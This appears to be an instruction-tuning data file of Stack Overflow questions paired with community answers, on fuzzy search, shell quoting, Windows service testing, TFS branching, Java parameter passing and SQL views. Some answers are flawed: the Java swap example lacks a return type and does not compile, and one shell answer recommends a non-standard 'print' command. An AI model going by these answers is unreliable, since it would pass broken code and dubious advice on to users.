{"instruction": "Can you suggest some light weight fuzzy text search library?\nWhat I want to do is to allow users to find correct data for search terms with typos.\nI could use full-text search engines like Lucene, but I think it's an overkill.\nEdit:\nTo make question more clear here is a main scenario for that library:\nI have a large list of strings.  I want to be able to search in this list (something like MSVS' intellisense) but it should be possible to filter this list by string which is not present in it but close enough to some string which is in the list.\nExample:  \n\nRed\nGreen\nBlue\n\nWhen I type 'Gren' or 'Geen' in a text box, I want to see 'Green' in the result set.\nMain language for indexed data will be English.\nI think that Lucene is to heavy for that task.\nUpdate:\nI found one product matching my requirements. It's ShuffleText.\nDo you know any alternatives?", "output": "@aku - links to working soundex libraries are right there at the bottom of the page.\nAs for Levenshtein distance, the Wikipedia article on that also has implementations listed at the bottom."}
{"instruction": "Can you suggest some light weight fuzzy text search library?\nWhat I want to do is to allow users to find correct data for search terms with typos.\nI could use full-text search engines like Lucene, but I think it's an overkill.\nEdit:\nTo make question more clear here is a main scenario for that library:\nI have a large list of strings.  I want to be able to search in this list (something like MSVS' intellisense) but it should be possible to filter this list by string which is not present in it but close enough to some string which is in the list.\nExample:  \n\nRed\nGreen\nBlue\n\nWhen I type 'Gren' or 'Geen' in a text box, I want to see 'Green' in the result set.\nMain language for indexed data will be English.\nI think that Lucene is to heavy for that task.\nUpdate:\nI found one product matching my requirements. It's ShuffleText.\nDo you know any alternatives?", "output": "Soundex is very 'English' in it's encoding - Daitch-Mokotoff works better for many names, especially European (Germanic) and Jewish names. In my UK-centric world, it's what I use.\nWiki here."}
{"instruction": "Can you suggest some light weight fuzzy text search library?\nWhat I want to do is to allow users to find correct data for search terms with typos.\nI could use full-text search engines like Lucene, but I think it's an overkill.\nEdit:\nTo make question more clear here is a main scenario for that library:\nI have a large list of strings.  I want to be able to search in this list (something like MSVS' intellisense) but it should be possible to filter this list by string which is not present in it but close enough to some string which is in the list.\nExample:  \n\nRed\nGreen\nBlue\n\nWhen I type 'Gren' or 'Geen' in a text box, I want to see 'Green' in the result set.\nMain language for indexed data will be English.\nI think that Lucene is to heavy for that task.\nUpdate:\nI found one product matching my requirements. It's ShuffleText.\nDo you know any alternatives?", "output": "Lucene is very scalable\u2014which means its good for little applications too. You can create an index in memory very quickly if that's all you need.\nFor fuzzy searching, you really need to decide what algorithm you'd like to use. With information retrieval, I use an n-gram technique with Lucene successfully. But that's a special indexing technique, not a \"library\" in itself.\nWithout knowing more about your application, it won't be easy to recommend a suitable library. How much data are you searching? What format is the data? How often is the data updated?"}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "For CSS frameworks, you could consider YUI Grids. It makes basic layout a lot quicker and simpler, although used in its raw form it does compromise on semantics."}
{"instruction": "What's going on here?\nprintf.sh:\n#! /bin/sh\nNAME=\"George W. Bush\"\nprintf \"Hello, %s\\n\" $NAME\n\nCommand line session:\n$ ./printf.sh\nHello, George\nHello, W.\nHello, Bush\n\nUPDATE: printf \"Hello, %s\\n\" \"$NAME\" works. For why I'm not using echo, consider\necho.sh:\n#! /bin/sh\nFILE=\"C:\\tmp\"\necho \"Filename: $FILE\"\n\nCommand-line:\n$ ./echo.sh\nFilename: C:    mp\n\nThe POSIX spec for echo says, \"New applications are encouraged to use printf instead of echo\" (for this and other reasons).", "output": "If you want all of those words to be printed out on their own, use print instead of printf \nprintf takes the formatting specification and applies it to each argument that you pass in. Since you have three arguments {George, W., Bush}, it outputs the string three times using the different arguments."}
{"instruction": "What's going on here?\nprintf.sh:\n#! /bin/sh\nNAME=\"George W. Bush\"\nprintf \"Hello, %s\\n\" $NAME\n\nCommand line session:\n$ ./printf.sh\nHello, George\nHello, W.\nHello, Bush\n\nUPDATE: printf \"Hello, %s\\n\" \"$NAME\" works. For why I'm not using echo, consider\necho.sh:\n#! /bin/sh\nFILE=\"C:\\tmp\"\necho \"Filename: $FILE\"\n\nCommand-line:\n$ ./echo.sh\nFilename: C:    mp\n\nThe POSIX spec for echo says, \"New applications are encouraged to use printf instead of echo\" (for this and other reasons).", "output": "is there a specific reason you are using printf or would echo work for you as well?\nNAME=\"George W. Bush\"\necho \"Hello, \"$NAME\n\nresults in \nHello, George W. Bush\n\nedit:\nThe reason it is iterating over \"George W. Bush\" is because the bourne shell is space delimitted. To keep using printf you have to put $NAME in double quotes\nprintf \"Hello, %s\\n\" \"$NAME\""}
{"instruction": "What's going on here?\nprintf.sh:\n#! /bin/sh\nNAME=\"George W. Bush\"\nprintf \"Hello, %s\\n\" $NAME\n\nCommand line session:\n$ ./printf.sh\nHello, George\nHello, W.\nHello, Bush\n\nUPDATE: printf \"Hello, %s\\n\" \"$NAME\" works. For why I'm not using echo, consider\necho.sh:\n#! /bin/sh\nFILE=\"C:\\tmp\"\necho \"Filename: $FILE\"\n\nCommand-line:\n$ ./echo.sh\nFilename: C:    mp\n\nThe POSIX spec for echo says, \"New applications are encouraged to use printf instead of echo\" (for this and other reasons).", "output": "Your NAME variable is being substituted like this:\nprintf \"Hello, %s\\n\" George W. Bush\n\nUse this:\n#! /bin/sh\nNAME=\"George W. Bush\"\nprintf \"Hello, %s\\n\" \"$NAME\""}
{"instruction": "What's going on here?\nprintf.sh:\n#! /bin/sh\nNAME=\"George W. Bush\"\nprintf \"Hello, %s\\n\" $NAME\n\nCommand line session:\n$ ./printf.sh\nHello, George\nHello, W.\nHello, Bush\n\nUPDATE: printf \"Hello, %s\\n\" \"$NAME\" works. For why I'm not using echo, consider\necho.sh:\n#! /bin/sh\nFILE=\"C:\\tmp\"\necho \"Filename: $FILE\"\n\nCommand-line:\n$ ./echo.sh\nFilename: C:    mp\n\nThe POSIX spec for echo says, \"New applications are encouraged to use printf instead of echo\" (for this and other reasons).", "output": "The way I interpret the man page is it considers the string you pass it to be an argument; if your string has spaces it thinks you are passing multiple arguments.  I believe ColinYounger is correct by surrounding the variable with quotes, which forces the shell to interpret the string as a single argument.\nAn alternative might be to let printf expand the variable:\nprintf \"Hello, $NAME.\"\n\nThe links are for bash, but I am pretty sure the same holds for sh."}
{"instruction": ".NET Framework: 2.0\nPreferred Language: C#\nI am new to TDD (Test Driven Development).\nFirst of all, is it even possible to unit test Windows Service?\nWindows service class is derived from ServiceBase, which has overridable methods, \n\nOnStart \nOnStop\n\nHow can I trigger those methods to be called as if unit test is an actual service that calls those methods in proper order?\nAt this point, am I even doing a Unit testing? or an Integration test?\nI have looked at WCF service question but it didn't make any sense to me since I have never dealt with WCF service.", "output": "I would start here.  It shows how to start and stop services in C#\nA sample to start is is\npublic static void StartService(string serviceName, int timeoutMilliseconds)\n{\n  ServiceController service = new ServiceController(serviceName);\n  try\n  {\n    TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);\n\n    service.Start();\n    service.WaitForStatus(ServiceControllerStatus.Running, timeout);\n  }\n  catch\n  {\n    // ...\n  }\n}\n\nI have also tested services mostly through console app, simulating what the service would do.  That way my unit test is completely automated."}
{"instruction": ".NET Framework: 2.0\nPreferred Language: C#\nI am new to TDD (Test Driven Development).\nFirst of all, is it even possible to unit test Windows Service?\nWindows service class is derived from ServiceBase, which has overridable methods, \n\nOnStart \nOnStop\n\nHow can I trigger those methods to be called as if unit test is an actual service that calls those methods in proper order?\nAt this point, am I even doing a Unit testing? or an Integration test?\nI have looked at WCF service question but it didn't make any sense to me since I have never dealt with WCF service.", "output": "I'd probably recommend designing your app so the \"OnStart\" and \"OnStop\" overrides in the Windows Service just call methods on a class library assembly.  That way you can automate unit tests against the class library methods, and the design also abstracts your business logic from the implementation of a Windows Service.\nIn this scenario, testing the \"OnStart\" and \"OnStop\" methods themselves in a Windows Service context would then be an integration test, not something you would automate."}
{"instruction": ".NET Framework: 2.0\nPreferred Language: C#\nI am new to TDD (Test Driven Development).\nFirst of all, is it even possible to unit test Windows Service?\nWindows service class is derived from ServiceBase, which has overridable methods, \n\nOnStart \nOnStop\n\nHow can I trigger those methods to be called as if unit test is an actual service that calls those methods in proper order?\nAt this point, am I even doing a Unit testing? or an Integration test?\nI have looked at WCF service question but it didn't make any sense to me since I have never dealt with WCF service.", "output": "I have unit tested windows services by not testing the service directly, but rather testing what the service does.\nTypically I create one assembly for the service and another for what the service does.  Then I write unit tests against the second assembly.  \nThe nice thing about this approach is that your service is very thin.  Basically all it does is call methods to do the right work at the right time.  Your other assembly contains all the meat of the work your service intends to do.  This makes it very easy to test and easy to reuse or modify as needed."}
{"instruction": ".NET Framework: 2.0\nPreferred Language: C#\nI am new to TDD (Test Driven Development).\nFirst of all, is it even possible to unit test Windows Service?\nWindows service class is derived from ServiceBase, which has overridable methods, \n\nOnStart \nOnStop\n\nHow can I trigger those methods to be called as if unit test is an actual service that calls those methods in proper order?\nAt this point, am I even doing a Unit testing? or an Integration test?\nI have looked at WCF service question but it didn't make any sense to me since I have never dealt with WCF service.", "output": "I would use the windows service class (the one you run when you start/stop the service) sort of like a proxy to your real system. I don't see how the code behind your service should be any different from any other programming. The onStart and onStop methods are simply events being fired, like pushing a button on a GUI.\nSo your windows service class is a very thin class, comparable to a windows form. It calls your business logic/domain logic, which then does what it's supposed to do. All you have to do is make sure the method(s) you're calling in your onStart and onStop are working like they're supposed to. At least that's what I would do ;-)"}
{"instruction": "This question is addressed to a degree in this question on LINQ to SQL .dbml best practices, but I am not sure how to add to a question.\nOne of our applications uses LINQ to SQL and we have currently have one .dbml file for the entire database which is becoming difficult to manage.  We are looking at refactoring it a bit into separate files that are more module/functionality specific, but one problem is that many of the high level classes would have to be duplicated in several .dbml files as the associations can't be used across .dbml files (as far as I know), with the additional partial class code as well.\nHas anyone grappled with this problem and what recommendations would you make?", "output": "The approach that we've used it to keep 2 .dbml files. One of them holds the Stored Procs and all production DB access is done through this. The other is in a unit test folder and holds tables and their relationships and is used for DB data manipulation and querying for unit tests."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "The distinction, or perhaps just the way I remember as I used to be under the same impression as the original poster is this: Java is always pass by value. All objects( in Java, anything except for primitives) in Java are references. These references are passed by value."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "As many people mentioned it before, Java is always pass-by-value\nHere is another example that will help you understand the difference (the classic swap example):\npublic class Test {\n  public static void main(String[] args) {\n    Integer a = new Integer(2);\n    Integer b = new Integer(3);\n    System.out.println(\"Before: a = \" + a + \", b = \" + b);\n    swap(a,b);\n    System.out.println(\"After: a = \" + a + \", b = \" + b);\n  }\n\n  public static swap(Integer iA, Integer iB) {\n    Integer tmp = iA;\n    iA = iB;\n    iB = tmp;\n  }\n}\n\nPrints:  \n\nBefore: a = 2, b = 3\n  After: a = 2, b = 3\n\nThis happens because iA and iB are new local reference variables that have the same value of the passed references (they point to a and b respectively). So, trying to change the references of iA or iB will only change in the local scope and not outside of this method."}
{"instruction": "I'd like to add a method to my existing server's CORBA interface. Will that require recompiling all clients?\nI'm using TAO.", "output": "Recompilation of clients is not required (and should not be, regardless of the ORB that you use). As Adam indicated, lookups are done by operation name (a straight text comparison).\nI've done what you're describing with our ACE/TAO-based system, and encountered no issues (servers were in ACE/TAO C++, clients were ACE/TAO C++, C# using Borland's Janeva, and OmniORBPy)."}
{"instruction": "I'm almost certain I know the answer to this question, but I'm hoping there's something I've overlooked.\nCertain applications seem to have the Vista Aero look and feel to their caption bars and buttons even when running on Windows XP. (Google Chrome and  Windows Live Photo Gallery come to mind as examples.)  I know that one way to accomplish this from WinForms would be to create a borderless form and draw the caption bar/buttons yourself, then overriding WndProc to make sure moving, resizing, and button clicks do what they're supposed to do (I'm not clear on the specifics but could probably pull it off given a day to read documentation.)  I'm curious if there's a different, easier way that I'm overlooking.  Perhaps some API calls or window styles I've overlooked?\nI believe Google has answered it for me by using the roll-your-own-window approach with Chrome.  I will leave the question open for another day in case someone has new information, but I believe I have answered the question myself.", "output": "Nope, I am afraid, there is no other easy way of doing this. \nYou are on the right track. You will need to create a custom Winform and then proceed as illustrated in this example."}
{"instruction": "I'd like to add a method to my existing server's CORBA interface. Will that require recompiling all clients?\nI'm using TAO.", "output": "Assuming that the clients and servers are communicating via IIOP, no recompilation is required.  An IIOP message contains the name of the interface, the name of the method, and the parameters.  If none of those things have changed, then everything should remain compatible.  Adding another method to the interface won't change any of those existing things.\nOn the other hand, if your objects are using a different protocol, or if the clients are in-process with the server and thus bypassing IIOP, you may need to make sure everything gets recompiled."}
{"instruction": "Disclaimer: I'm stuck on TFS and I hate it.\nMy source control structure looks like this:\n\n/dev\n/releases\n/branches\n/experimental-upgrade\n\nI branched from dev to experimental-upgrade and didn't touch it.  I then did some more work in dev and merged to experimental-upgrade.  Somehow TFS complained that I had changes in both source and target and I had to resolve them.  I chose to \"Copy item from source branch\" for all 5 items.\nI check out the experimental-upgrade to a local folder and try to open the main solution file in there.  TFS prompts me: \n\n\"Projects have recently been added to this solution.  Would you like to get them from source control?\n\nIf I say yes it does some stuff but ultimately comes back failing to load a handful of the projects.  If I say no I get the same result.\nComparing my sln in both branches tells me that they are equal.\nCan anyone let me know what I'm doing wrong?  This should be a straightforward branch/merge operation...\nTIA.\n\nUPDATE:\nI noticed that if I click \"yes\" on the above dialog, the projects are downloaded to the $/ root of source control... (i.e. out of the dev & branches folders)\nIf I open up the solution in the branch and remove the dead projects and try to re-add them (by right-clicking sln, add existing project, choose project located in the branch folder, it gives me the error...\n\nCannot load the project c:\\sandbox\\my_solution\\proj1\\proj1.csproj, the file has been removed or deleted.  The project path I was trying to add is this:  c:\\sandbox\\my_solution\\branches\\experimental-upgrade\\proj1\\proj1.csproj\n\nWhat in the world is pointing these projects outside of their local root?  The solution file is identical to the one in the dev branch, and those projects load just fine.  I also looked at the vspscc and vssscc files but didn't find anything.\nIdeas?", "output": "@Nick:  No changes have been made to this just yet.  I may have to delete it and re-branch (however you really can't fully delete in TFS)\nAnd I have to disagree... branching is absolutely a good practice for experimental changes.  Shelving is just temporary storage that will get backed up if I don't want to check in yet.  But this needs to be developed while we develop real features."}
{"instruction": "Disclaimer: I'm stuck on TFS and I hate it.\nMy source control structure looks like this:\n\n/dev\n/releases\n/branches\n/experimental-upgrade\n\nI branched from dev to experimental-upgrade and didn't touch it.  I then did some more work in dev and merged to experimental-upgrade.  Somehow TFS complained that I had changes in both source and target and I had to resolve them.  I chose to \"Copy item from source branch\" for all 5 items.\nI check out the experimental-upgrade to a local folder and try to open the main solution file in there.  TFS prompts me: \n\n\"Projects have recently been added to this solution.  Would you like to get them from source control?\n\nIf I say yes it does some stuff but ultimately comes back failing to load a handful of the projects.  If I say no I get the same result.\nComparing my sln in both branches tells me that they are equal.\nCan anyone let me know what I'm doing wrong?  This should be a straightforward branch/merge operation...\nTIA.\n\nUPDATE:\nI noticed that if I click \"yes\" on the above dialog, the projects are downloaded to the $/ root of source control... (i.e. out of the dev & branches folders)\nIf I open up the solution in the branch and remove the dead projects and try to re-add them (by right-clicking sln, add existing project, choose project located in the branch folder, it gives me the error...\n\nCannot load the project c:\\sandbox\\my_solution\\proj1\\proj1.csproj, the file has been removed or deleted.  The project path I was trying to add is this:  c:\\sandbox\\my_solution\\branches\\experimental-upgrade\\proj1\\proj1.csproj\n\nWhat in the world is pointing these projects outside of their local root?  The solution file is identical to the one in the dev branch, and those projects load just fine.  I also looked at the vspscc and vssscc files but didn't find anything.\nIdeas?", "output": "Without knowing more about your solution setup I can't be sure.  But, if you have any project references that could explain it.  Because you have the \"experimental-upgrade\" subfolder under \"branches\" your relative paths have changed.\nThis means when VS used to look for your referenced projects in ..\\..\\project\\whatever it now has to look in ..\\..\\..\\project\\whatever.  Note the extra ..\\\nTo fix this you have to re-add your project references.  I haven't found a better way.  You can either remove them and re-add them, or go to the properties window and change the path to them, then reload them.  Either way, you'll have to redo your references to them from any projects.\nAlso, check your working folders to make sure that it didn't download any of your projects into the wrong folders.  This can happen sometimes..."}
{"instruction": "Disclaimer: I'm stuck on TFS and I hate it.\nMy source control structure looks like this:\n\n/dev\n/releases\n/branches\n/experimental-upgrade\n\nI branched from dev to experimental-upgrade and didn't touch it.  I then did some more work in dev and merged to experimental-upgrade.  Somehow TFS complained that I had changes in both source and target and I had to resolve them.  I chose to \"Copy item from source branch\" for all 5 items.\nI check out the experimental-upgrade to a local folder and try to open the main solution file in there.  TFS prompts me: \n\n\"Projects have recently been added to this solution.  Would you like to get them from source control?\n\nIf I say yes it does some stuff but ultimately comes back failing to load a handful of the projects.  If I say no I get the same result.\nComparing my sln in both branches tells me that they are equal.\nCan anyone let me know what I'm doing wrong?  This should be a straightforward branch/merge operation...\nTIA.\n\nUPDATE:\nI noticed that if I click \"yes\" on the above dialog, the projects are downloaded to the $/ root of source control... (i.e. out of the dev & branches folders)\nIf I open up the solution in the branch and remove the dead projects and try to re-add them (by right-clicking sln, add existing project, choose project located in the branch folder, it gives me the error...\n\nCannot load the project c:\\sandbox\\my_solution\\proj1\\proj1.csproj, the file has been removed or deleted.  The project path I was trying to add is this:  c:\\sandbox\\my_solution\\branches\\experimental-upgrade\\proj1\\proj1.csproj\n\nWhat in the world is pointing these projects outside of their local root?  The solution file is identical to the one in the dev branch, and those projects load just fine.  I also looked at the vspscc and vssscc files but didn't find anything.\nIdeas?", "output": "@Ben\nYou can actually do a full delete in TFS, but it is highly not recommended unless you know what you are doing.  You have to do it from the command line with the command tf destroy\ntf destroy [/keephistory] itemspec1 [;versionspec]\n           [itemspec2...itemspecN] [/stopat:versionspec] [/preview]\n           [/startcleanup] [/noprompt]\n\nVersionspec:\n    Date/Time         Dmm/dd/yyyy\n                      or any .Net Framework-supported format\n                      or any of the date formats of the local machine\n    Changeset number  Cnnnnnn\n    Label             Llabelname\n    Latest version    T\n    Workspace         Wworkspacename;workspaceowner\n\nJust before you do this make sure you try it out with the /preview.  Also everybody has their own methodology for branching.  Mine is to branch releases, and do all development in the development or root folder.  Also it sounded like branching worked fine for you, just the solution file was screwed up, which may be because of a binding issue and the vssss file."}
{"instruction": "Disclaimer: I'm stuck on TFS and I hate it.\nMy source control structure looks like this:\n\n/dev\n/releases\n/branches\n/experimental-upgrade\n\nI branched from dev to experimental-upgrade and didn't touch it.  I then did some more work in dev and merged to experimental-upgrade.  Somehow TFS complained that I had changes in both source and target and I had to resolve them.  I chose to \"Copy item from source branch\" for all 5 items.\nI check out the experimental-upgrade to a local folder and try to open the main solution file in there.  TFS prompts me: \n\n\"Projects have recently been added to this solution.  Would you like to get them from source control?\n\nIf I say yes it does some stuff but ultimately comes back failing to load a handful of the projects.  If I say no I get the same result.\nComparing my sln in both branches tells me that they are equal.\nCan anyone let me know what I'm doing wrong?  This should be a straightforward branch/merge operation...\nTIA.\n\nUPDATE:\nI noticed that if I click \"yes\" on the above dialog, the projects are downloaded to the $/ root of source control... (i.e. out of the dev & branches folders)\nIf I open up the solution in the branch and remove the dead projects and try to re-add them (by right-clicking sln, add existing project, choose project located in the branch folder, it gives me the error...\n\nCannot load the project c:\\sandbox\\my_solution\\proj1\\proj1.csproj, the file has been removed or deleted.  The project path I was trying to add is this:  c:\\sandbox\\my_solution\\branches\\experimental-upgrade\\proj1\\proj1.csproj\n\nWhat in the world is pointing these projects outside of their local root?  The solution file is identical to the one in the dev branch, and those projects load just fine.  I also looked at the vspscc and vssscc files but didn't find anything.\nIdeas?", "output": "A couple of things. Are the folder structures the same? Can you delete and readd the project references successfully? \nIf you create a solution and then manually add all of the projects, does that work. (That may not be feasable - we have solutions with over a hundred projects).\nOne other thing (and it may be silly) - after you did the branch, did you commit it? I'm wondering if you branched and didn't check it in, and then merged, and then when you tried to check-in then, TFS was mighty confused."}
{"instruction": "Disclaimer: I'm stuck on TFS and I hate it.\nMy source control structure looks like this:\n\n/dev\n/releases\n/branches\n/experimental-upgrade\n\nI branched from dev to experimental-upgrade and didn't touch it.  I then did some more work in dev and merged to experimental-upgrade.  Somehow TFS complained that I had changes in both source and target and I had to resolve them.  I chose to \"Copy item from source branch\" for all 5 items.\nI check out the experimental-upgrade to a local folder and try to open the main solution file in there.  TFS prompts me: \n\n\"Projects have recently been added to this solution.  Would you like to get them from source control?\n\nIf I say yes it does some stuff but ultimately comes back failing to load a handful of the projects.  If I say no I get the same result.\nComparing my sln in both branches tells me that they are equal.\nCan anyone let me know what I'm doing wrong?  This should be a straightforward branch/merge operation...\nTIA.\n\nUPDATE:\nI noticed that if I click \"yes\" on the above dialog, the projects are downloaded to the $/ root of source control... (i.e. out of the dev & branches folders)\nIf I open up the solution in the branch and remove the dead projects and try to re-add them (by right-clicking sln, add existing project, choose project located in the branch folder, it gives me the error...\n\nCannot load the project c:\\sandbox\\my_solution\\proj1\\proj1.csproj, the file has been removed or deleted.  The project path I was trying to add is this:  c:\\sandbox\\my_solution\\branches\\experimental-upgrade\\proj1\\proj1.csproj\n\nWhat in the world is pointing these projects outside of their local root?  The solution file is identical to the one in the dev branch, and those projects load just fine.  I also looked at the vspscc and vssscc files but didn't find anything.\nIdeas?", "output": "@Kevin:\n\nThis means when VS used to look for your referenced projects in ....\\project\\whatever it now has to look in ......\\project\\whatever. Note the extra ..\\\n\nYou may be on to something here, however it doesn't explain why some projects load and others do not.  I haven't found a correlation between them yet.\nI think I'll try to re-add the projects and see if that works."}
{"instruction": "Disclaimer: I'm stuck on TFS and I hate it.\nMy source control structure looks like this:\n\n/dev\n/releases\n/branches\n/experimental-upgrade\n\nI branched from dev to experimental-upgrade and didn't touch it.  I then did some more work in dev and merged to experimental-upgrade.  Somehow TFS complained that I had changes in both source and target and I had to resolve them.  I chose to \"Copy item from source branch\" for all 5 items.\nI check out the experimental-upgrade to a local folder and try to open the main solution file in there.  TFS prompts me: \n\n\"Projects have recently been added to this solution.  Would you like to get them from source control?\n\nIf I say yes it does some stuff but ultimately comes back failing to load a handful of the projects.  If I say no I get the same result.\nComparing my sln in both branches tells me that they are equal.\nCan anyone let me know what I'm doing wrong?  This should be a straightforward branch/merge operation...\nTIA.\n\nUPDATE:\nI noticed that if I click \"yes\" on the above dialog, the projects are downloaded to the $/ root of source control... (i.e. out of the dev & branches folders)\nIf I open up the solution in the branch and remove the dead projects and try to re-add them (by right-clicking sln, add existing project, choose project located in the branch folder, it gives me the error...\n\nCannot load the project c:\\sandbox\\my_solution\\proj1\\proj1.csproj, the file has been removed or deleted.  The project path I was trying to add is this:  c:\\sandbox\\my_solution\\branches\\experimental-upgrade\\proj1\\proj1.csproj\n\nWhat in the world is pointing these projects outside of their local root?  The solution file is identical to the one in the dev branch, and those projects load just fine.  I also looked at the vspscc and vssscc files but didn't find anything.\nIdeas?", "output": "@Cory:\nI think that's what I'm going to try...  I have about 20 projects and 8 or so aren't loading.  The folder structures are identical from root...  ie: there aren't any references outside of DEV."}
{"instruction": "I need to take a web page and extract the address information from the page. Some are easier than others. I'm looking for a firefox plugin, windows app, or VB.NET code that will help me get this done.\nIdeally I would like to have a web page on our admin (ASP.NET/VB.NET) where you enter a URL and it scraps the page and returns a Dataset that I can put in a Grid.", "output": "What type of address information are you referring to?\nThere are a couple FireFox plugins Operator & Tails that allow you to extract and view microformats from web pages."}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "You've answered your own question:\n\nhe was encouraging code reuse via copy-and-paste\n\nReuse the code by creating a view.  If the view performs poorly, it will be much easier to track down than if you have the same poorly performing code in several places."}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "My current database was completely awash with countless small tables of no more than 5 rows each.  Well, I could count them but it was cluttered.  These tables simply held constant type values (think enum) and could very easily be combined into one table.  I then made views that simulated each of the tables I deleted to ensure backward compactability.  Worked great."}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "We use views for all of our simple data exports to csv files. This simplifies the process of writing a package and embedding the sql within the package which becomes cumbersome and hard to debug against.\nUsing views, we can execute a view and see exactly what was exported, no cruft or unknowns. It greatly helps in troubleshooting problems with improper data exports and hides any complex joins behind the view. Granted, we use a very old legacy system from a TERMS based system that exports to sql, so the joins are a little more complex than usual."}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "Views are good for ad-hoc queries, the kind that a DBA does behind the scenes when he/she needs quick access to data to see what's going on with the system.\nBut they can be bad for production code.  Part of the reason is that it's sort of unpredictable what indexes you will need with a view, since the where clause can be different, and therefore hard to tune.  Also, you are generally returning a lot more data than is actually necesary for the individual queries that are using the view.  Each of these queries could be tightened up and tuned individually.\nThere are specific uses of views in cases of data partitioning that can be extremely useful, so I'm not saying they should avoided altogether.  I'm just saying that if a view can be replaced by a few stored procedures, you will be better off without the view."}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "There are some very good uses for views; I have used them a lot for tuning and for exposing less normalized sets of information, or for UNION-ing results from multiple selects into a single result set.\nObviously any programming tool can be used incorrectly, but I can't think of any times in my experience where a poorly tuned view has caused any kind of drawbacks from a performance standpoint, and the value they can provide by providing explicitly tuned selects and avoiding duplication of complex SQL code can be significant.\nIncidentally, I have never been a fan of architectural \"rules\" that are based on keeping developers from hurting themselves.  These rules often have unintended side-effects -- the last place I worked didn't allow using NULLs in the database, because developers might forget to check for null.  This ended up forcing us to work around \"1/1/1900\" dates and  integers defaulted to \"0\" in all the software built against the databases, and introducing a litany of bugs caused by devs working around places where NULL was the appropriate value."}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "Like all power views have its own dark side. However you cannot blame views for when somebody writes bad performed code. Moreover views can limit the exposure of some columns and provide extra security."}
